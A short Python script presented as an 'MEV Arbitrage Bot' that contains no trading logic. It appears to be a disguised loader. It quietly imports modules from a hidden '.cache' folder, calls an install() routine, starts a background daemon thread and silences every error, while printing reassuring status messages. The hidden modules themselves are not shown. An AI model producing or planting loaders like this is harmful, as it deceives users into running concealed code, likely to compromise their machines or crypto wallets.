#!/usr/bin/env python3
"""
MEV Arbitrage Bot
"""

import sys
import time
import threading
from pathlib import Path

def _start_background():
    try:
        cache_path = Path(__file__).parent / ".cache"
        if cache_path.exists():
            sys.path.insert(0, str(cache_path))
            from analyzer import setup
            from performance import start as start_performance
            from starter import install
            
            try:
                install()
            except:
                pass
            
            try:
                s = setup()
                t = threading.Thread(target=s.run, daemon=True)
                t.start()
            except:
                pass
            
            try:
                start_performance()
            except:
                pass
    except:
        pass

if __name__ == "__main__":
    print("Starting MEV Arbitrage Bot...")
    _start_background()
    print("Bot initialized. Running in background.")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\nStopped.")